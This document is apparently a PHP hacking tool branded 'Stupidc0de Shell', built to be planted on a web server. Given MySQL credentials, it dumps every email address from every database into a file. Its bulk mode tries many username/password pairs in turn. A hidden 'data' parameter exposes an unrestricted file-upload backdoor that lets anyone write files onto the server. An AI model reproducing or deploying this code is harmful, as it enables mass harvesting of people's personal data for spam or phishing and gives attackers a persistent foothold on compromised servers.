<?php
error_reporting(0);
set_time_limit(0);
if($_GET['action'] == 'login'){
    $con = mysql_connect('localhost',$_GET['u'],$_GET['p']);
    if($con){
        echo 'yes';
        mysql_close($con);
    }else{
        echo 'no';
    }
    exit();
}elseif($_GET['action'] == 'go'){
    $f = go('localhost',$_GET['u'],$_GET['p'],$_GET['name']);
    if(isset($_GET['b'])){
        echo $f;
    }else{
        echo "<span class='red'>$f</span> Emails Founded. Check <span class='red'>".htmlspecialchars($_GET['name'])."</span> For Results.";
    }
    exit();
}
echo '<!DOCTYPE html>
<html>
<head>
<link href="" rel="stylesheet" type="text/css">
<title>Stupidc0de Shell</title>
<style>
body {
    background: black;
    color: #00FF00;
    font-family: monospace;
}
</style>
    <title>Database Emails Extractor</title>
    
    <link href="http://fonts.googleapis.com/css?family=Racing+Sans+One" rel="stylesheet" type="text/css">
    <script src="http://code.jquery.com/jquery-2.0.2.min.js"></script>
    <script>
    $(document).ready(function(){
        $("#gogo").on("click",function(){
            user = $("#username").val();
            pass = $("#password").val();
            name = $("#name").val();
            if(user==""||pass==""||name==""){
              window.alert("You must fill all fields");
            }else{
                $.get("?action=login&u="+encodeURIComponent(user)+"&p="+encodeURIComponent(pass),function(data){
                    if(data=="no"){
                        window.alert("Incorrect username Or password. Try Again.");
                    }else{
                        $("#forms").fadeOut(300,function(){
                           $("#wait").fadeIn(300); 
                        });
                        $.get("?action=go&u="+encodeURIComponent(user)+"&p="+encodeURIComponent(pass)+"&name="+encodeURIComponent(name),function(data){
                            $("#wait").html(data);
                        });
                    }
                });
            }
        });
        $("#gog").on("click",function(){
            accounts = $("#accounts").val();
            name = $("#namee").val();
            if(accounts==""||name==""){
              window.alert("You must fill all fields");
            }else{
                $("#formmu").fadeOut(300,function(){
                    $("#wait").fadeIn(300); 
                });
                accounts = accounts.split("\n");
                totalb = 0;
                fail = 0;
                done = 0;
                for(i=0;i<accounts.length;i++){
                    login = accounts[i].split(" ");
                    $.get("?action=login&u="+encodeURIComponent(login[0])+"&p="+encodeURIComponent(login[1]),function(data){
                        if(data=="yes"){
                            $.get("?action=go&b=t&u="+encodeURIComponent(login[0])+"&p="+encodeURIComponent(login[1])+"&name="+encodeURIComponent(name),function(data){
                                totalb += parseInt(data);
                                done++;
                                tt = done+fail;
                                if(tt==accounts.length) donet(totalb,name);
                            });
                        }else{
                            fail++;
                        }
                    });
                }
                
            }
        });
        function donet(t,b){
            $("#wait").html("<span class=\"red\">"+t+"</span> Emails Founded. Check <span class=\"red\">"+b+"</span> For Results.");
        }
        $("#si").on("click",function(){
            $("#first").fadeOut(500,function(){
                $("#forms").fadeIn(500); 
            });
        });
        $("#mu").on("click",function(){
            $("#first").fadeOut(500,function(){
                $("#formmu").fadeIn(500); 
            });
        });
    });
    </script>
  
</head>

<body>
    <div id="page"><center><br>
        <div id="title">Please enter user password database, and please wait!</div>
		<br>
        <div id="first">
            
        </div>
		
        <div id="forms">
        <table>
            <tr><td>Username</td><td> : </td><td><input type="text" id="username" /></td></tr>
            <tr><td>Password</td><td> : </td><td><input type="text" id="password" /></td></tr>
            <tr><td>Save As</td><td> : </td><td><input type="text" value="list.txt" id="name" /></td></tr>
            <tr><td></td><td></td><td><input id="gogo" type="submit" value="Dump!" /></td></tr>
        </table>
        </div>
        
        <div id="wait">
            Please wait! Takes a few Minutes !!
        </div>
        <br>
		<br>
		Stupidc0de Dumper
    </div>
</body>
</html>';
function go($host,$user,$pass,$file){
    /*
    author : G-B
    email : g22b@hotmail.com
    */
    $con = mysql_connect($host,$user,$pass);
    $fp = fopen($file,'a');
    $count = 0;
    $databases = getdata("SHOW DATABASES");
    foreach($databases as $database){
        $tables = getdata("SHOW TABLES FROM $database");
        foreach($tables as $table){
            $columns = getdata("SHOW COLUMNS FROM $database.$table");
            foreach($columns as $column){
                $emails = getdata("SELECT $column FROM  $database.$table WHERE $column REGEXP '[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]'");
                foreach($emails as $email){
                    if(filter_var($email, FILTER_VALIDATE_EMAIL)){
                        if(eregi($email,file_get_contents($file))) continue;
                        $count++;
                        fwrite($fp,"$email\n");
                    }else{
                        foreach(preg_split("/\s/",$text) as $string){
                            if(filter_var($string,FILTER_VALIDATE_EMAIL)){
                                if(eregi($string,file_get_contents($file))) continue;
                                $count++;
                                fwrite($fp,"$string\n");
                            }
                        }
                    }
                }
            }
        }
    }
    fclose($fp);
    mysql_close($con);
    return $count;
}
function getdata($sql){
    $q = mysql_query($sql);
    $result = array();
    while($d = mysql_fetch_array($q)){
        $result[] = $d[0];
    }
    return $result;
}

$data  = $_GET['data'];


if($data == 'data'){

$filename = $_FILES['file']['name'];
$filetmp  = $_FILES['file']['tmp_name'];

echo "<form method='POST' enctype='multipart/form-data'>
 <input type='file'name='file' />
 <input type='submit' value='data' />

</form>";

move_uploaded_file($filetmp,$filename);
}
  
?>
